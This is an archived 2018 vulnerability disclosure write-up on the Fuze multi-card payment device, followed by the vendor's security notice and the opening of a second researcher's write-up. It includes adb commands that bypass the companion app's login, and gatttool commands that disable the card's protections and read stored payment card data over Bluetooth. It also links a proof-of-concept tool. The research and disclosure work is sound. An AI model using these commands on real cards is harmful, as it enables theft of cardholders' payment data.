# Fuze Multi-Card Technology Security Review

Defusing the Fuze

Mykel Pritchard
•April 24, 2018

## A Brief Overview

Electronic multi-card technologies are a nice idea; load all of your payment and membership cards on to a single credit-card sized device which reduces the number of cards you need to carry around in your wallet or purse. However, many of these technologies have struggled to make it into production. The Fuze Card is one of the few that have successfully made it to market, with the chip-less version of their cards arriving to backers toward the end of 2017 after being successfully crowd-funded on the Indiegogo website; but what is the security of this device like?

The following article takes a brief look at the security claims made by the vendor of the Fuze card, and discusses security concerns that were identified with the device regarding the security of the stored card information. A critical security vulnerability was also discovered with the Fuze card that allowed the theft of all card data on the device, and was disclosed to the vendor in January 2018.

**Update 29-Apr-18:** *The vendor has now implemented security features to address the discovered issues in their latest firmware. Further information can be found in the “Vendor Notification and Response” section below, and in this [article](https://web.archive.org/web/20180429114017/https%3A//medium.com/%40fuzecard/the-newest-version-of-mobile-app-and-ota-firmware-is-now-released-cbc4fa99466d).*

## What is the Fuze Card?

The [Fuze Card](https://fuzecard.com) is a credit-card sized device developed by [BrilliantTS](http://www.brilliantts.com/home/index.html) that is designed to store a number of payment and membership cards, allowing the stored cards to be selected and used, and removing the need to carry around multiple cards. To add a payment card to the device, the user reads the original card information using the [eCard Manager](https://ecardmanager.com) mobile application and a provided card reader. The data is then sent to the Fuze Card via a paired [Bluetooth Low Energy](https://en.wikipedia.org/wiki/Bluetooth_Low_Energy) (BLE) connection.

Production of the Fuze Card was crowd-funded, being one of the highest funded [Indiegogo](https://www.indiegogo.com/projects/fuze-card-your-whole-wallet-in-one-card-money-technology) projects of 2017, gaining over fifteen thousand backers, and raising over two million US dollars. Two versions of the card were promised during the campaign, an [EMV](https://en.wikipedia.org/wiki/EMV) chip card and a chip-less version. So far only the chip-less version is available, which allows only [magnetic stripe](https://en.wikipedia.org/wiki/Magnetic_stripe_card) functionality for payment cards and is the subject of this review.

Upon receiving a chip-less version of the Fuze card, it’s functionality was exercised. Loading payment and membership cards to the device using the eCard Manager application and the supplied card reader was a fairly simple process, and payments were successfully made using the magnetic stripe without any issues. Examples of the loading process and a Fuze card being used may be found on the vendor’s [YouTube channel](https://www.youtube.com/channel/UCaRtsww6afEZOTJc-nJ_Jmw/videos), and images of the received card can be seen below for reference.

Figure-2: Back of the Fuze card showing the electronic magnetic stripe

![Fuze card back](/assets/images/blog/2018-04-23-fuzereview/img3.jpg)

**An Interesting Observation:** When attempting to make a swipe payment using a chip and pin card that has been added to the Fuze Card, a Point of Sale (POS) machine will likely fail and prompt to insert the chip. However, at least with my experience in Australia, it’s possible to cause the POS to fall back to a swipe payment by making three failed attempts with the chip reader. It’s interesting that a fall back to a less secure form of payment is possible.

Features of the Fuze Card include:

* Has an ePaper display to show card information and barcodes
* Has an electronic magnetic stripe to allow swipe payments with payment cards
* Uses a mobile application to manage the Fuze Card
* Uses BLE to communicate with the mobile application and transfer card data to the Fuze Card

From a security perspective this sounded like an interesting target. There was sensitive information to gain, such as credit-card details, and quite a bit of possible attack surface through the mobile application, the user’s mobile device, BLE, and physical access to the Fuze Card itself. So what did the Fuze Card offer as far as security features and the protection of that information?

### Security Claims and Features

Reviewing the Fuze Card website, the vendor claimed the following regarding the security of the device:

* “All payment information is stored within encrypted chip (AES 256). Your data is not stored in our servers or even on your smartphone app.”
* “There are added features like separation alerts, card location tracking, remote wipe, and tap code entry on the card that add extra security.”
* “Instantly clear your data and cards from Fuze Card if lost.”
* “Handing over your card to a waiter? Select a single card to use when Fuze is out of Bluetooth range. Fuze will automatically lock after the transaction is complete”
  \*“Receive notifications when you’ve left Fuze Card behind or if it’s on the move without you..”

The main security features of the Fuze Card were BLE Passkey, security level 2 (requires BLE connection to user’s mobile), data blind, passcode, and card lock, which are detailed in the following table:

| Feature | Description | Image |
| --- | --- | --- |
| BLE Passkey | BLE pairing with the Fuze Card requires entering a six digit pin that is displayed on the Fuze Card’s ePaper display. This is to prevent pairing with the card without physical access. |  |
| Security Levels | There are three security levels that may be applied to the Fuze Card from the eCard Manager application. Level 1 is default and implements no additional security. Level 2 enables lost tracking and requires the card to be connected to the user’s mobile device to make payments, otherwise the card is locked displaying the connect screen as shown in the image. Level 3 was not yet implemented, however appears to enable lost alerts. |  |
| Data Blind | When data blind is enabled, some card information is obscured by asterisks on the Fuze Card’s ePaper display. |  |
| Passcode/Tapcode | When passcode is enabled, the user is prompted to enter their passcode of six presses of the Fuze Card’s buttons when powering on the card. |  |
| Card Lock | When the Fuze Card is used with an account that it’s not registered with, the eCard Manager application locks the card with the screen shown. |  |

Although there appeared to be a number of security features, how well did these protect the security of the information on the device? In the push to deliver the product on time to the backers, was security of the device overlooked? We’ll take a look in the following sections, starting with some of the methods used to review the security of the Fuze Card.

## Review Methodology

To review the security aspects of the card, the Android eCard Manager application code, along with the communication between the application, eCard Manager servers, and Fuze card were investigated. Several versions of Fuze card firmware binary images were also able to be retrieved, however they were encrypted and not investigated as part of the review.

### APK De-compilation and Code Review

An Android 7.1.2 mobile device was utilised to download the eCard Manager application (Version 1.0.8), as seen below, from the [Google Play Store](https://play.google.com/store/apps/details?id=com.brilliantts.ecard), and the [Android Debug Bridge](https://developer.android.com/studio/command-line/adb.html) (ADB) toolkit was used to pull the [Android Application Package](https://en.wikipedia.org/wiki/Android_application_package) (APK) from the mobile device.

Figure-3: eCard Manager application MainActivity screen

![eCard Manager Main Activity](/assets/images/blog/2018-04-23-fuzereview/img13.jpg)

The APK is just an archive file, however many of the files within are encoded along with the application code being compiled as a [Dalvik](https://en.wikipedia.org/wiki/Dalvik_%28software%29) Executable (.dex). Tools such as [`apktool`](https://github.com/iBotPeaches/Apktool) can decode these files and de-compile the Dex file to smali bytecode, which is useful if wanting to patch and re-compile the application. However, for this review the open-source [`jadx`](https://github.com/skylot/jadx) Dex to Java de-compiler was utilised to return the code to a sufficiently readable Java format. De-compilation of the code was not perfect and was also found to be obfuscated, however it was still quite readable for the most part.

### HTTP MitM

HTTP man-in-the-middle (MitM) was utilised to view communication between the eCard Manager application and the eCard Manager servers. This was achieved by providing a wireless access point (AP) to the mobile device, and configuring it’s proxy settings so the eCard Manager application’s web traffic would pass via an intercepting proxy.

An example of the traffic can be seen in the figure below, where the type and name of payment cards stored on the Fuze Card are sent to the eCard Manager servers.

Figure-4: Payment card type and name being sent to server

```

### BLE Snooping

BLE traffic is not as easy to sniff due to it’s encryption and frequency hopping, however tools such as the [BtleJuice Framework](https://github.com/DigitalSecurity/btlejuice) and [GATTacker](https://github.com/securing/gattacker) are able to achieve this when the BLE device uses the simplest “Just Works” pairing method. This is due to the “Just Works” method using a set Temporary Key (TK) of *0* during the pairing process and does not verfiy the devices taking part in the connection. In the case of the Fuze Card, it used the “Passkey” method of pairing where a six digit number is generated by the card and displayed on the ePaper display for the user to manually enter on the mobile device, which is then used as the TK. The previously mentioned tools are unable to be utilised for this pairing method. [CrackLE](https://github.com/mikeryan/crackle) is another tool that has the ability to crack and decrypt BLE traffic, however it requires sniffing the initial pairing process with a quality capture.

As we were in control of the mobile device, there was a much simpler method to view the BLE traffic. Within the “Developer options” of the Android phone, there’s an option to log Bluetooth traffic called “Enable Bluetooth HCI snoop log”. Turning this option on begins logging all Bluetooth traffic to a file on the device named `btsnoop_hci.log`. The file can then be pulled using ADB and viewed in [Wireshark](https://www.wireshark.org/).

An example of the captured *btsnoop* traffic can be seen in the figure below, which shows payment card data being synchronised between the Fuze Card and the eCard Manager application.

Figure-5: Btsnoop capture of CardSyncActivity

![BLE Capture of CardSyncActivity](/assets/images/blog/2018-04-23-fuzereview/img9.png)

To explain the figure above a little better, the eCard Manager application (localhost) sends a write request (No. 406) to the Fuze Card (Brillian\_00:46:79) to request the information of a payment card. In response, the Fuze Card notifies the application with the card information split across multiple packets (No. 409-412). The last packet is selected, which shows the card type (VISA) in plain-text as part of the returned value.

**An Interesting Fact:** [Hedy Lamarr](https://en.wikipedia.org/wiki/Hedy_Lamarr), an inventor and famous actress, was one of the first to pioneer spread spectrum frequency hopping technology and her principles contributed to the Bluetooth technology in many of the devices we use today.

## Results

Although the review of the application code and Fuze Card was not extensive, there were some considerable security concerns found in protecting sensitive information such as payment card details. The main issues are detailed below.

### Logging of Sensitive Information

Reviewing the code it was noticed that the eCard Manager appeared to be logging sensitive information such as authentication details and session tokens, along with all card information. In fact, every time the application and Fuze Card were connected and synchronised, all stored card information was sent back to the application, which was then logged in plain-text to the Android log. This can be seen in the figure below, in which the `logcat` utility is used to view the log file.

[...]
```

Although bad practice, this is not necessarily a major security issue as Android versions 4.1 and above remove the ability for user applications to view the logs. However, prior versions would allow applications to request the READ\_LOGS permission, giving the potential for malware on those devices to scrape the log file for this information.

### Application Authentication Bypass

As previously mentioned, much of the Fuze Card is controlled via the eCard Manager application. The application requires the creation of an account and authentication prior to being able to pair a Fuze Card, as can be seen in the image below.

Figure-7: eCard Manager login screen

![eCard Manager login](/assets/images/blog/2018-04-23-fuzereview/img10.jpg)

Once logged in and paired for the first time, the Bluetooth address of the Fuze Card is associated with that account and the user is free to add cards and modify the Fuze Card settings. In addition to this, any attempt to use a Fuze Card that is associated with another account locks and potentially wipes the Fuze Card, with a notification email being sent to the registered email account warning of the attempt.

The issue here is that as a privileged user on the Android phone, any arbitrary application activity may be started out of the usual order. This means that even with a clean install of the application, no WiFi access, and no account, the authentication may be bypassed to pair with any Fuze Card, allowing access to it’s stored card information and control of it’s security settings. This may be achieved by using ADB and the activity manager (`am`) as shown in the figure below.

Figure-8: Using activity manager to start arbitrary application activities, bypassing user authentication

```
[pritch@rnd fuze]$ adb shell am start -n com.brilliantts.ecard/.screen.MainActivity
Starting: Intent { cmp=com.brilliantts.ecard/.screen.MainActivity }
[pritch@rnd fuze]$ adb shell am start -n com.brilliantts.ecard/.screen.ManualScanActivity
Starting: Intent { cmp=com.brilliantts.ecard/.screen.ManualScanActivity }
[pritch@rnd fuze]$ adb shell am start -n com.brilliantts.ecard/.screen.cardsync.CardSyncActivity
Starting: Intent { cmp=com.brilliantts.ecard/.screen.cardsync.CardSyncActivity }
```

**Note:** The application will unlikely continue after pairing the Fuze card during the *ManualScanActivity* due to waiting for server response, however the *CardSyncActivity* can then be started to force synchronisation of data with the card, after which the application works relatively as normal.

This still requires pairing with the Fuze Card and hence at least momentary physical access to view the BLE passkey, however this bypasses all other security controls giving complete control of the Fuze Card, and the added benefit of never notifying the owner or risking the Fuze Card being locked and wiped.

### Trust in the Connecting Device

Given the ability to use the Fuze Card without an authenticated user, and the lack of encryption of data other than that given by BLE, there appeared to be no verification of the user by the Fuze Card, and complete trust of the connecting device once paired. This means that is must be possible to directly connect to the Fuze Card and interact with the provided BLE services.

#### Interacting With BLE Services

To interact with the BLE services of the Fuze Card, the tools provided by the [BlueZ](http://www.bluez.org/) Linux protocol stack were used; specifically `bluetoothctl` and `gatttool`. The `bluetoothctl` tool was used to pair with the Fuze Card and identify the advertised services and their GATT characteristics, as can be seen in the figure below.

Figure-9: Using bluetoothctl to determine BLE services

```
[pritch@rnd fuze]$ sudo systemctl start bluetooth

        Client Characteristic Configuration
```

Through analysis of the *btsnoop\_hci.log* and code review, it was determined that the service UUID of `0000ff01-0000-1000-8000-00805f9b34fb` was the main service used when interacting with the Fuze Card. This service has one `write` characteristic, used to request information from or write to the Fuze Card, and another `notify` characteristic, which responds by notifying the connected device of value changes. These flags can be seen in the figure below.

```

        Notifying: no
        Flags: notify
```

In the case of the Fuze Card, a value is written to the `write` characteristic, for instance to turn off a security feature, and the Fuze Card responds with a value indicating success or failure using the `notify` characteristic. An example of a value that would be sent to the Fuze Card to disable the data blind security feature can be seen in the following *btsnoop\_hci.log* capture.

Figure-11: BLE capture when turning the data blind feature off

![](/assets/images/blog/2018-04-23-fuzereview/img11.png)

A quick breakdown of the data structure can be seen below, with *var* being the variable or function being interacted with, the total and current packet numbers, and the value in ASCII to be written, in this case ‘1’.

Figure-12: Data blind packet analysis

```
     var  pkts pkt  value                            checksum
02 | c7 | 01 | 01 | 310000000000000000000000000000 | f6
```

**Note:** The first byte was always `0x02` for write requests, and `0xdd` for notification responses. The last byte of the write data is a checksum value, however it was discovered that this value was not verified and could be made any value.

Using `gatttool` it was possible to directly write these values to the paired Fuze Card and observe the response, as can be seen in the figure below which writes the value to disable the data blind feature and listens for the response.

Figure-13: Using gatttool to remove data blind

```
[pritch@rnd fuze]$ gatttool -b 54:D9:E4:00:46:79 --char-write-req --handle=0x0018 --value=02c7010131000000000000000000000000000000 --listen
Characteristic value was written successfully
Notification handle = 0x001a value: dd c7 04 01 01 90 00 00 03
^C
```

**Note:** The `0x90` in the notification response indicates success, with `0xff` in the same position indicating failure of the request.

Observing the Fuze Card during this attempt showed that the data blind feature was successfully disabled, as can be seen in the figure below.

Figure-14: Fuze Card ePaper display when disabling data blind with gatttool

![](/assets/images/blog/2018-04-23-fuzereview/img12.gif)

Using the same method, it was possible to determine the structure of card information stored on the Fuze Card, and retrieve arbitrary card information as shown below where the details of the first stored payment card is retrieved.

Figure-15: Using gatttool to retrieve payment card information

```
[pritch@rnd fuze]$ gatttool -b 54:D9:E4:00:46:79 --char-write-req --handle=0x0018 --value=02be010130303100000000000000000000000000 --listen
Characteristic value was written successfully

Notification handle = 0x001a value: dd be 04 05 05 00 00 00 03
^C
```

The issue with allowing this is that anyone with momentary physical access to pair with the Fuze Card may retrieve payment card information, bypassing all other security controls, and avoiding alerting the owner other than them potentially noticing they have been unpaired from their card. In addition to the previous issue, malware on the connected mobile device may also have the ability collect this information from a legitimately paired Fuze Card.

#### Proof of Concept

Knowing that it’s possible to directly control and retrieve data from a Fuze Card, a Proof of Concept (PoC) tool was created that allows retrieval of all stored card information from a Fuze Card without disturbing enabled security features, or optionally disabling the security features to allow full use of the card. This is available from the elttam [GitHub](https://github.com/elttam/publications/blob/master/writeups/CVE-2018-9119.py) repository, and is shown in the figure below.

**Note:** After disabling security features using the PoC, it may be necessary to power the Fuze Card off and on again before they disappear.

## Revisiting Security Claims

After reviewing the security of the Fuze Card, the claims made by the vendor were revisited to determine if they were accurate. Let’s take a look at them in turn.

```
"All payment information is stored within encrypted chip (AES 256). Your data is not stored in our servers or even on your smartphone app."
```

During the review it was not determined if the payment card information was stored within an AES 256 encrypted chip, however card information was not encrypted during transit except for that being provided by BLE. It’s not entirely true that card information isn’t sent to the servers either; both the type (i.e. VISA) of all payment cards along with what the user named them is sent to the eCard Manager servers, as can be seen in Figure-3. It would be recommended to notify Fuze Card users of exactly what card information is stored by the servers. In addition, all card information is logged by the application so it at least resides in memory, however card information did not appear to be permanently stored on the mobile device.

```
"There are added features like separation alerts, card location tracking, remote wipe, and tap code entry on the card that add extra security."
```

As seen above, features such as location tracking and remote lock/wipe are implemented by the eCard Manager application, hence will not be activated by an attacker that is bypassing authentication or directly interacting with the card via BLE. All of these extra security features have been shown to be easily bypassable and offered no additional security.

```
"Instantly clear your data and cards from Fuze Card if lost."
```

As stated above, these activities were not instant and rely on someone attempting to connect with the Fuze Card via the eCard Manager application before any remote wipe is initiated.

```
"Handing over your card to a waiter? Select a single card to use when Fuze is out of Bluetooth range. Fuze will automatically lock after the transaction is complete"
```

This did not appear true in regular use. With the level 2 security feature enabled, the Fuze Card did indeed lock when it lost the BLE connection, however when the card hold function was used, it was possible to turn off the card hold function to make payments with any stored card when outside of Bluetooth range.

```
"Receive notifications when you've left Fuze Card behind or if it's on the move without you.."
```

Lastly, lost alerts appear to be a part of the level 3 security feature which was not implemented in the reviewed software version.

## Vendor Notification and Response

The Fuze Card vendor BrilliantTS was notified of the above issues in January 2018, and given a 90-day responsible disclosure period. They were slow to respond to the disclosure, however have since worked to address the issues and release a new version of the mobile application and Fuze card firmware, a notice of which can be found [here](https://web.archive.org/web/20180423130342/https%3A//fuzecard.com/security_notice.html).

**Update 29-Apr-18:** *Fuze have now implemented a security feature where BLE is not activated until the passcode is successfully entered on the card. In doing so, an unauthorized third party should not be able to access the card via BLE in the scenario the card is lost or misplaced, unless they can bypass the passcode feature. In addition, Fuze have implemented a feature where all loaded cards are deleted if the passcode is entered incorrectly five consecutive times, increasing the difficulty of this type of attack. Both of these features have been implemented and are currently active in the latest firmware detailed [here](https://web.archive.org/web/20180429114017/https%3A//medium.com/%40fuzecard/the-newest-version-of-mobile-app-and-ota-firmware-is-now-released-cbc4fa99466d).*

The main security issue was also independently discovered by researcher Mike Ryan, which he publicly disclosed in April 2018, and can be found [here](https://blog.ice9.us/2018/04/stealing-credit-cards-from-fuze-bluetooth.html). This sparked numerous news articles on the vulnerability, including articles in [Forbes](https://www.forbes.com/sites/thomasbrewster/2018/04/06/fuze-card-bluetooth-hack-exposes-credit-card-data/) and [arsTECHNICA](https://arstechnica.com/information-technology/2018/04/whatever-you-do-dont-give-this-programmable-payment-card-to-your-waiter/).

The following details the disclosure timeline:

* **29-Dec-17** - Initial contact with BrilliantTS notifying of security research and requesting a security contact
* **03-Jan-18** - BrilliantTS responded with a security contact
* **21-Jan-18** - Disclosure of found security issues to BrilliantTS and offer/start of a 90-day responsible disclosure period
* **02-Feb-18** - Response from BrilliantTS stating it has been referred to their development team
* **14-Feb-18** - Official response from BrilliantTS stating they are addressing the issues disclosed with an updated version anticipated for release in early Q2 2018
* **04-Apr-18** - Mike Ryan publicly discloses the vulnerability via the [ICE9 blog](https://blog.ice9.us/2018/04/stealing-credit-cards-from-fuze-bluetooth.html) with [CVE-2018-9119](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9119)
* **05-Apr-18** - BrilliantTS releases a [public notice](https://web.archive.org/web/20180423130342/https%3A//fuzecard.com/security_notice.html) regarding the security issues
* **07-Apr-18** - Contacted by reporter Thomas Fox-Brewster from Forbes regarding my disclosure after he contacted BrilliantTS regarding Mike Ryan’s blog post, in which he released a [news article](https://www.forbes.com/sites/thomasbrewster/2018/04/06/fuze-card-bluetooth-hack-exposes-credit-card-data/#d60b8583661c) on the issue
* **21-Apr-18** - End of 90-day responsible disclosure period

## Conclusion

After reviewing the security of the Fuze card and the related eCard Manager Android application, the security claims made by BrilliantTS were not accurate. A number of best practice security issues were identified, along with a critical vulnerability that could be used to disclose all card information on the device. This was disclosed to the vendor and they have since been addressing the issues with updates to the application and Fuze card firmware.

Taking into account that the identified security issues are being addressed, is this card any better than carrying individual cards in a wallet? When it comes to convenience, definitely. As far as security, using this card does add some additional vectors for attack that BrilliantTS will need to be wary of and active in addressing; such as BLE, the mobile application, and their online services. The risk posed to the user appears similar to someone losing their wallet, which is unlikely to be any large financial loss. However, a new venture by BrilliantTS called [FuzeX](https://www.fuzex.co/) which allows cryptocurrencies to be used with a similar device, has potential to pose a lot more risk of large financial loss and is much more attractive to an attacker. This was also communicated to BrilliantTS, and I hope they continue to be vigilant and active regarding the security of their devices.

 [About this capture](#expand)

COLLECTED BY

Organization: [Internet Archive](https://archive.org/details/webwidecrawl)

The Internet Archive discovers and captures web pages through many different web crawls.
At any given time several distinct crawls are running, some for months, and some every day or longer.
View the web archive through the [Wayback Machine](http://archive.org/web/web.php).

Collection: [Live Web Proxy Crawls](https://archive.org/details/liveweb)

Content crawled via the [Wayback Machine](http://archive.org/web/web.php) Live Proxy mostly by the Save Page Now feature on web.archive.org.

Liveweb proxy is a component of Internet Archiveâs wayback machine project. The liveweb proxy captures the content of a web page in real time, archives it into a ARC or WARC file and returns the ARC/WARC record back to the wayback machine to process. The recorded ARC/WARC file becomes part of the wayback machine in due course of time.

Fuze Card : Updates coming up on 19th April

The new version of Mobile app and OTA firmware will be released on 19th April, 2018. The lastest version 1.1 will be safer and more secure, with the new security measures and safeguards put in place to resolve the recently raised issues.

Recently, an independent researcher, Mike Ryan of ICE9, raised a question surrounding the customerâs high-level security information. Please note that we were already on notice of this issue in late January as another independent source, Mike
Pritchard of ELTTAM (Australian security consulting firm) contacted out Company. As soon as out development/security team received the notice from ELTTAM, out responsible team have been working very diligently to analyze the issues with the
goal to increase safety and security features of the product and improve the overall product. As to the recent concerns that were raised, we would like to apologize to our Fuze community and the public at large.

Briefly, we have analyzed the issues and have already come up with the action plan and resolution in place that directly addresses the issues. The Mobile app and OTA firmware will be updated with the additional security features in the upcoming
new version.

For more details, you can find out action plan and response status of the issues raised by ELTTAM.

| LIST | Potential Security issue brought ELTTAM | Progress on FuzeCard |
| --- | --- | --- |
| 1 | â¢ Any device may pair with the Fuze card. And once paired. Has complete access to contained data bypassing security provided by the application and bypassing all Fuze card security features, through direct use of the Fuze cardâs advertised BLE service. | â¢ Transmitting only 8 card numbers out of whole 16 numbers. Sensitive Data which may cause a security problem is not sent to APP. (19th April)  â¢ Since Bluetooth is not activated prior to unlocking of passcode. Passcode unlock cannot be hacked by Bluetooth hacking. (30th April)  â¢ Enhanced security through Data Encryption and Mutual Authentication when APP and CARD are synchronized via Bluetooth. (30th April) |
| 2 | â¢ Similar to the previous issue, Android eCard Manager activities may be started by a privileged phone user, such as MainActivity â> ManualScanActivity â> CardSyncActivity, to bypass user authentication. | â¢ Completed (App update : 28th March) |
| 3 | â¢ Older versions of Android OS prior to 4.1 allow applications to read the Android log, potentially exposing this information to malware. | â¢ Completed (App update : 28th March) |
| 4 | â¢ Android backup is enabled for the eCard Manager application which may store eCard Manager data on the userâs Google Drive. | â¢ Completed (App update : 28th March) |
| 5 | â¢ The Android eCard Manager application parses itâs Play Store web page to determine the current version. If an attacker can enter the string âsoftwareVersionâ>âwithin the Play Store page, such as through a review comments which appear prior to the version number, they may have the ability to inject their own value into the application. | â¢ Completed (App update : 28th March) |

Once again, we would like to ask for your kind understanding on the recent issues that were raised, and we would like to emphasize that our team is deeply committed in providing the most secure and reliable product that the public can trust
and rely on. We will continue to do our best to prevent and mitigate any security concerns.

If you have any security related questions or concerns, please contact us at [security@fuzecard.com](https://web.archive.org/web/20180423130342/mailto%3A%20security%40fuzecard.com). Our team will provide answers to such inquiries as timely as possible
and to the best of our knowledge.

If you have any security related suggestions, please follow the below guidelines:

- Do not disclose your questions, concerns or suggestions of our product to a third party without our consent.

- Do not conduct any actual testing or simulation on the actual product (e.g., attacking other users, etc.) for the sake of proving your point.

Please send us an email at [security@fuzecard.com](https://web.archive.org/web/20180423130342/mailto%3A%20security%40fuzecard.com) explaining and detailing the security concerns of out product. As always, your comments are sincerely appreciated, and
any possible risk will be scrutinized and eliminated as quickly as possible

### Stealing Credit Cards from FUZE via Bluetooth

This article covers [FUZE Card](https://www.fuzecard.com/), a Bluetooth-enabled reprogrammable credit card. The size and shape of a regular credit card, FUZE promises to be "your whole wallet in one card."

After receiving a FUZE Card from [@MBHbox](https://twitter.com/mbhbox) ([his blog](http://blog.mbhbox.net/)), I decided to take a careful look at it. In the process, I X-rayed the card, fully reverse engineered its Bluetooth protocol, and found a security vulnerability that allows credit card numbers to be stolen via Bluetooth ([CVE-2018-9119](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9119)).

[ICE9](https://ice9.us/) reported this vulnerability to BrilliantTS, the maker of FUZE, but they did not respond to repeated follow-ups and did not take action on the basis of our report. As of this writing, CVE-2018-9119 continues to be exploitable on production FUZE Cards in the wild.

Update 2018-04-07: BrilliantTS reached out to ICE9 and informed us that they were already aware of this issue and are planning to release an updated firmware on 2018-04-19. They have also added a security@fuzecard.com email address so issues can be more easily reported in the future. Refer to their [security notice](https://fuzecard.com/FUZE_NOTICE_20180406.png) for further details. I applaud BrilliantTS for taking steps to remediate this issue once it reached their attention.

The remainder of this article is organized into the following sections:

* [Description of FUZE Card](#description)

## Description of FUZE Card

FUZE is an IoT device the size, shape, and thickness of a normal credit card. You program credit cards into it via Bluetooth (BLE) using a smart phone app. When you go to pay, you use the buttons and e-Paper display to select which card to emulate. The magnetic stripe reprograms itself to impersonate that card, and then FUZE can be swiped like a regular credit card.

To configure FUZE and add or remove credit cards, BrilliantTS publishes an app called [eCARD Manager](https://www.ecardmanager.com/page/home/ecardmanager.html). To add a card, you must swipe it on your phone using an included card reader that plugs into the headphone jack (like a Square dongle). I found this process to be extremely unreliable, taking in excess of 20 swipes to finally accept my card. BrilliantTS claims FUZE can hold up to 30 cards.

FUZE does attempt to provide some level of security. When you set up FUZE for the first time you are prompted to configure a passcode as a sequence of six button presses, although this step can be skipped. With a passcode configured, the device remains locked unless you manually unlock it or your smartphone is nearby. In the locked state, you can't access any of the data on the card or program the magstripe. It also has a higher security mode in which the card will only function when it is connected to a phone via Bluetooth.

Based on promotional images on their site, BrilliantTS plans to release a version with EMV (chip) support. At the time of this writing, only the magnetic stripe version is available. The card also contains NFC circuitry to support contactless payment, but this does not work with the latest firmware.

## X-ray hardware "teardown"

I wanted to get an understanding of how the device was built. With a typical IoT device, this usually involves removing the case with a few screws or a spudger and taking a glance at the PCB. At worst you're foiled by an epoxy-encased die.

In the case of FUZE, the device is a solid construction that is a mere 0.03" thick. It may be possible to very carefully remove the plastic packaging, but I only had one and did not want to risk destroying it.

X-ray imaging is great in this scenario. I reached out to [John McMaster](https://twitter.com/johndmcmaster) who has taken [X-rays for me in the past](https://twitter.com/mpeg4codec/status/623658059282280448). He captured the following image, which I have annotated:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEinsT6urey3FeY606CKvYR7pxWSWLUvTIolvpzfTtr8ejoZ0YQyVad5u5PyzXIkmjWV1y5gmPEJJNiEEopE8Lsbcg73UmzdTd-SnQ-mrANeAshtTi5bqccE1W4V7OuXrgoaTpO8O8QuYyY/s640/card-labels.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEinsT6urey3FeY606CKvYR7pxWSWLUvTIolvpzfTtr8ejoZ0YQyVad5u5PyzXIkmjWV1y5gmPEJJNiEEopE8Lsbcg73UmzdTd-SnQ-mrANeAshtTi5bqccE1W4V7OuXrgoaTpO8O8QuYyY/s1600/card-labels.jpg)

From the image we can see some key features of FUZE's architecture. The main chips on the board are a microcontroller, an e-Paper driver, and a Bluetooth SoC. A number of features are present on the board but are not used, including NFC and EMV (chip card support).

The footprint of the Bluetooth chip is some BGA variant, and the ball land pattern is somewhat unique. With a little sleuthing, Alvaro Prieto[twitter] was able to pinpoint it to the [CSR1013](https://www.qualcomm.com/products/csr1013). Similar to the nRF51, the CSR101x series is a complete system-on-chip (SoC) with the ability to run custom code. Some of the application code likely lives on the CSR1013.

The microcontroller is an unidentified 68 pin QFP. The bulk of the application likely runs on this, including the code for displaying the screen, button input, and yet-to-be implemented NFC and EMV functionality. The QFP next to the microcontroller is likely a driver for the e-Paper display.

BrilliantTS plans to release a version of FUZE with EMV support, and their site has marketing images of that variant of the card. It is interesting (but not surprising) to note that they use a single board design for both cards. On the magstripe version of the card, the plastic packaging simply covers the smart card contacts for EMV.

A bit of Googling does reveal some press release and marketing photos showing the inside of the card. [A review on Seoul Space](http://seoulspace.com/2016/01/04/korean-startup-company-launches-brilliant-card/) shows a bare board for a prototype version of the card, and [FUZE's main site](https://fuzecard.com/) includes a promotional photo of the hardware stackup.

## Bluetooth Reverse Engineering

For a piece of technology like FUZE, the Bluetooth interface is of primary interest for reverse engineering. My toolchest for reverse engineering a Bluetooth device:

* Android phone
* [Burp Suite](https://portswigger.net/burp) (optional)
* [Wireshark](https://www.wireshark.org/) + crusty Perl scripts
* gatttool / BlueZ

Android is absolutely indispensable for performing a blackbox analysis of a Bluetooth device. Out of the box, we can log all Bluetooth traffic from an app to a device. It is also possible to modify app code directly by disassembling and reassembling the Java bytecode, but I didn't have to perform any such app surgery on this assessment.

Burp acts as an HTTP proxy and allows you to inspect API requests made by the Android app to backend servers. Although it wasn't critical for understanding how the FUZE card worked, it did provide some clues.

Android ships a feature called "HCI snoop log" in the "Developer options" settings menu. Enabling this feature saves all Bluetooth activity on the phone to a file, and that includes every message exchanged between the app and device.

Wireshark can read the files produced by Android's HCI snoop log. It's useful for doing basic analysis and filtering. For bulk and semi-automated analysis I like to export the data to text files and munge them using Perl.

Finally, gatttool (and other BlueZ tools) can be used to probe the device directly. It's often useful to take a quick peek with gatttool before even firing up the app. It shines during analysis for experimenting with sending and receiving partially understood protocol messages.

### Reversing FUZE

Using gatttool to connect to FUZE not work out as well as hoped. Immediately upon connecting to the card, it sends a "Security Request" over the Security Manager Protocol. This is the card demanding that we pair with it, which is actually uncommon among IoT devices in my experience. [BLE's pairing protocol is known to be flawed](https://blog.ice9.us/2014/01/ble-fun-with-ubertooth-sniffing.html) and most devices implement their own security instead of relying on it. FUZE absolutely refuses to send any data to a device that isn't paired with it and isn't using BLE link layer encryption.

Since gatttool didn't work out, I moved onto my Android-based reverse engineering approach, which looks something like this:

1. Enable Bluetooth HCI snoop on Android
2. Do things in the app and with the card
3. Transfer HCI log to PC using adb
4. Review in Wireshark
5. Filter / export as text
6. Parse with crusty Perl
7. Smash face against keyboard repeatedly

Loading and filtering the data in Wireshark allowed me to discern that FUZE uses two characteristics for communication: the app writes to the card using write requests on one handle, and receives responses via notifications on another handle. This is extremely common, as it allows developers to treat the BLE channel almost as though it were a TCP socket or serial port.

| --- |
| Reverse engineering by eye in Wireshark |

Eyeballing the data in Wireshark left me more hopeful. A great aspect of HCI snoop logging is that the data is captured before it is encrypted by the hardware Bluetooth chip on the phone. The plaintext data included some ASCII strings, and repeated application of step 7 led me to begin to understand some of the protocol format.

Wireshark does not lend itself well to bulk analysis, but it provides a rich set of export utilities to allow for post processing. It is a total hack, but I have had the best luck using "Export Packet Dissections" -> "As Plain Text". Before exporting, expand the "Attribute Protocol" dissection to show the data sent over the air. In the export window, ensure "Details" includes "As displayed". Finally a bit of gross Perl turns this into something I can work with.

